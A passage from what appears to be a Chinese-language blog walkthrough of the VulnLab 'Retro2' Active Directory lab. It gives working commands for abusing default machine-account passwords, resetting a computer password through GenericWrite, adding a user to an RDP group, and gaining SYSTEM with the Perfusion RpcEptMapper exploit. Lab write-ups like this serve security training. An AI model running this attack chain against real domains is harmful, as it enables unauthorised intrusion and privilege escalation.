+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H ldap://10.10.109.46 -x -D <span class="string">&#x27;retro2\ldapreader&#x27;</span> -w <span class="string">&#x27;ppYaVcB5R&#x27;</span> -b <span class="string">&quot;DC=retro2,DC=vl&quot;</span> <span class="string">&quot;(userAccountControl=4128)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103051437-b6o973y.png" alt="image">​</p>
+<p>得到 <code>fs01$</code>​ 和 <code>fs02$</code>​ 都設置了<code>userAccountControl=4128</code>​ 這個屬性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 10.10.109.46 -u <span class="string">&#x27;fs01$&#x27;</span> -p <span class="string">&#x27;fs01&#x27;</span> -k</span><br><span class="line">$ netexec ldap 10.10.109.46 -u <span class="string">&#x27;fs02$&#x27;</span> -p <span class="string">&#x27;fs02&#x27;</span> -k</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103051541-u3rkvjg.png" alt="image">​</p>
+<p>由於得到了一個普通的用戶，就可以嘗試使用 <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">Bloodhound.py</a> 收集域内數據，從 Bloodhound 中看到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103052041-xwkydt7.png" alt="image">​</p>
+<p>​<code>fs01</code>​和 <code>fs02</code>​ 的機器屬於 <code>Domain Computers</code>​ 這個組，這個組可以直接 <code>GenericWrite</code>​ 到 <code>ADMWS01</code>​ 這臺機器，然後這臺機器也有權限加入一些用戶 &#x2F; 電腦去 <code>Services</code>​，這樣就可以 RDP 那臺 <code>BLN01</code>​ 的電腦。</p>
+<p>所以首先先需要獲得一張 TGT，這樣才可以和 LDAP 進行交互：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ getTGT.py <span class="string">&#x27;retro2.vl/fs01$&#x27;</span>@bln01.retro2.vl -dc-ip 10.10.109.46</span><br><span class="line">&lt;fs01&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103053422-1rfi90f.png" alt="image">​</p>
+<p>然後看一下有沒有 adcs：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec ldap 10.10.109.46 -u <span class="string">&#x27;fs01$&#x27;</span> -p <span class="string">&#x27;fs01&#x27;</span> -k -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103061420-itojhqz.png" alt="image">​</p>
+<p>結果沒有 ADCS，所以  <code>Shadow Credentials</code>​ 這臺路走不通，但是對面的對象是一臺機器，所以 <code>targetKerberoasting</code>​ 這臺路也走不通，因爲機器的密碼是隨機的。 如果修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>​ 進行 RBCD attack，很抱歉對面是 2008 年的操作系統，這個屬性只有<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity">2012</a>年才有。</p>
+<p>好在，對於老版本的windows，可以直接設置 <code>unicodePwd</code>​ 來修改密碼，也就是說直接使用  <code>bloodyAD</code>​ 修改即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bloodyAD --host BLN01.retro2.vl -d retro2.vl -u fs01$ -k <span class="built_in">set</span> password <span class="string">&#x27;ADMWS01$&#x27;</span> P@ssw0rd</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103061337-n7wjvf6.png" alt="image">​</p>
+<p>修改成功了之後由於可以增加電腦 &#x2F; 用戶 去 <code>Services</code>​這個組，但是機器用戶沒辦法當作 RDP 賬號。不過可以從一開始拿到的 <code>ldapreader</code>​ 加進去<code>Services</code>​這個組然後嘗試RDP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ powerview <span class="string">&#x27;retro2.vl/ADMWS01$:P@ssw0rd&#x27;</span>@bln01.retro2.vl</span><br><span class="line">PV &gt; Add-DomainGroupMember -Identity SERVICES -Members ldapreader</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103062633-398lgvh.png" alt="image">​</p>
+<p>之後就是使用 RDP 連一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xfreerdp /v:10.10.109.46 /u:ldapreader /p:<span class="string">&#x27;ppYaVcB5R&#x27;</span> /cert:ignore /tls-seclevel:0</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103062719-029xsel.png" alt="image">​</p>
+<p>然後得到 User：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103062743-9ns4lk6.png" alt="image">​</p>
+<h1 id="Exploit-rpceptmapper-to-get-root"><a href="#Exploit-rpceptmapper-to-get-root" class="headerlink" title="Exploit rpceptmapper to get root"></a>Exploit rpceptmapper to get root</h1><p>關於提權的部分可以參考這篇文章：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/Perfusion">https://github.com/itm4n/Perfusion</a></p>
+</li>
+</ul>
+<p>從<a target="_blank" rel="noopener" href="https://github.com/itm4n/Perfusion">Perfusion的github</a>中下載源代碼，然後在本地編譯一下，之後上傳上去就得到了 NT System：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Perfusion.exe -c cmd -i</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103065403-ei5bmtu.png" alt="image">​</p>
+<p>然後就可以訪問 administrator 的桌面提取 root.txt 了。</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&text=VulnLab - Machine - Retro2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&is_video=false&description=VulnLab - Machine - Retro2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Retro2&body=Check out this article: https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&name=VulnLab - Machine - Retro2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&t=VulnLab - Machine - Retro2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
